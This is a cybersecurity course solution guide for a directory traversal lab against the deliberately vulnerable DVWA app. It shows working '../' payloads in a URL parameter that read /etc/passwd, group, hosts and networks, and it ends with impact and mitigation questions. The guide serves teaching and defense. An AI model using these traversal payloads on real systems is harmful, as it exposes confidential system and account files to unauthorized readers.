## Solution Guide: Directory Traversal 

In this activity, you were tasked with testing the intended purpose of an application to view back-end files from the web application's server. You were then tasked with manipulating the URL with the dot-slash technique to view confidential and hidden files on the web application server.

---

1. Test the intended use of the web application.

    - View the contents of `File1.php`.
      
      - Select the link to `File1.php`, and note the following:
      
          - The URL changes to <http://192.168.13.25/vulnerabilities/fi/?page=file1.ph>.
          
          - Note that the parameter references the file that was selected: `?page=file1.php`.
        
          - The content on the webpage was displayed:
      
              `Hello admin
              Your IP address is: 192.168.13.1`
          
      - Select the other links (`File2.php` and `File3.php`) and note their URL and webpage changes.
      
      - Note that the intended purpose of this application is to provide a user access to those three files only. 

2. On Vagrant, open the terminal. 

      - Connect to the container of the Replicants webpage:

        - `docker exec -it dvwa bash`
      
      - Once you have connected to the container, run the following command to access the directory where `file1.php`, `file2.php`, and `file3.php` are located:

        - `cd /var/www/html/vulnerabilities/fi`

      - View the files in this directory using the `ls` command.

        - Note that you should see the files `file1.php`, `file2.php`, and `file3.php`.

      - View the contents at the top of `file2.php`:
        
        -  `head file2.php`
      
        - Note how this file contains HTML that matches what you saw on the Replicants website when you clicked on `file2.php`:
          
          - `<em>I needed a password eight characters long so I picked Snow White and the Seven Dwarves.</em>\" ~ Nick Helm<br /><br />`

        - Take note of the other `file<#>.php` file located in this directory. 

    - **Solution**: The other `file<#>.php` file located in this directory is `file4.php`.
 
3. Test the unintended consequences of this application.
 
    - We saw another `file<#>.php` file in that directory. That file does not have a link to access on Replicant's webpage. Try to access it by modifying the parameter of the URL.

      - **Solution**: To view `file4.php`, change the URL to <http://192.168.13.25/vulnerabilities/fi/?page=file4.php>.

      - The parameter changed to `?page=file4.php`.
        
      - The webpage will display the following message:
          
            File 4 (Hidden)
            Good job!
            This file isn't listed at all on DVWA. If you are reading this, you did something right ;-)
          
4. Traverse through other paths. 

    - In Part 3, you modified the parameter of the URL to view a hidden file. Try to access the `passwd` file by modifying the parameter of the URL again.

    - **Solution**: To view the `passwd` file, you need to use the dot-slash method.
      
      - First we need to determine how many directories back the top of the directory structure is. Because the files are located in `/var/www/html/vulnerabilities/fi#`, they are five files deep.

        - To go back five directories, we use the dot-slash method five times. Then we go forward to access the `/etc/passwd` file:

          - `../../../../../etc/passwd`

        - The complete URL will look like the following, when we place the payload as the parameter: <http://192.168.13.25/vulnerabilities/fi/?page=../../../../../etc/passwd>.

      - This will display the `/etc/passwd` file at the top of the page:

          ```
            root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin       sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
        ```

      - Note that if we don't know how many directories back to go, we keep testing payloads until we see the `passwd` file. For example: 

        -  `../etc/passwd`

        -  `../../etc/passwd`

        - `../../../etc/passwd`

        - `../../../../etc/passwd`

5. **Bonus**: Previously, you were modified the URL to view the file `passwd`. Try to access other files (such as the hosts, group, or networks) using the same techniques.

    - If you can access the files, research online and document what data those files contain.

    - **Solution**: To view the files for hosts, group, or networks, you need to use the same dot-slash method.

      - The URLs for each of these are as follows:

        - <http://192.168.13.25/vulnerabilities/fi/?page=../../../../../etc/group>
      
        - <http://192.168.13.25/vulnerabilities/fi/?page=../../../../../etc/networks>
      
        - <http://192.168.13.25/vulnerabilities/fi/?page=../../../../../etc/hosts>
        
      - These files contain the following information:

        - `group`: Contains all the groups and members for that linux server.

        - `networks`: Translates IP addresses to network names.
        
        - `hosts`: Maps host names to IP addresses.
      
6. Answer the following mitigation strategy questions: 

    - Describe to your management how a malicious user could take advantage of the vulnerabilities that you just exploited. Be sure to include the potential impact.

        - Impacts could include:

          - Display of confidential data such as user information, system accounts, services being ran, networking information (IP Addresses).

          - All of the confidential information could be used to apply other types of attacks.

    - Describe how you would mitigate the vulnerabilities you just exploited.

      - Mitigation options can include:

        - Server-side validation that does not allow selection of unintended files.

        - Segregation of confidential files from the web server and accessible directories.

        - Permissions to restrict web server account accessibility.
        
      - Refer to the following page for a more comprehensive list of directory traversal mitigations: 

        - [Hacksplaining: Preventing Directory Traversal](https://www.hacksplaining.com/prevention/directory-traversal)    

  
___

© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved. 
